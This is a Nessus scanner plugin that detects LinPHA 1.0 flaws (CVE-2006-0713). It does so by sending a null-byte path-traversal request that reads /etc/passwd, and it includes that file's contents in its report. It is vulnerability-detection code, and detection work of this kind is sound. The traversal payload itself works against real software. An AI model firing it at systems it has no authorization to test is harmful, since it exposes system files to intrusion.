#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple flaws. 

Description :

The remote host is running LinPHA, a web photo gallery application
written in PHP. 

The installed version of LinPHA suffers from a number of flaws,
several of which may allow an unauthenticated attacker to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id. 

Note that successful exploitation requires that PHP's
'magic_quotes_gpc' setting be disabled, that an attacker has the
ability to create / upload / edit files on the remote host, or that
the application's 'user login events log' setting be enabled. 

See also :

http://retrogod.altervista.org/linpha_10_local.html
http://www.securityfocus.com/archive/1/424729/30/0/threaded

Solution :

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";


if (description) {
  script_id(20892);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-0713");
  script_bugtraq_id(16592);

  script_name(english:"LinPHA <= 1.0 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in LinPHA <= 1.0");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/linpha", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read /etc/passwd.
  file = "/../../../../../../../../../../etc/passwd";
  req = http_get(
    item:string(
      dir, "/docs/index.php?",
      "lang=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(string:res, pattern:"main\(\.\./lang/lang\..+/etc/passwd\\0\.php.+ failed to open stream") ||
    egrep(string:res, pattern:"Failed opening '\.\./lang/lang\..+/etc/passwd\\0\.php' for inclusion")
  ) {
    if (egrep(string:res, pattern:"root:.*:0:[01]:")) 
      contents = res - strstr(res, "<!DOCTYPE HTML PUBLIC");

    if (isnull(contents)) report = desc;
    else {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
    }

    security_note(port:port, data:report);
    exit(0);
  }
}
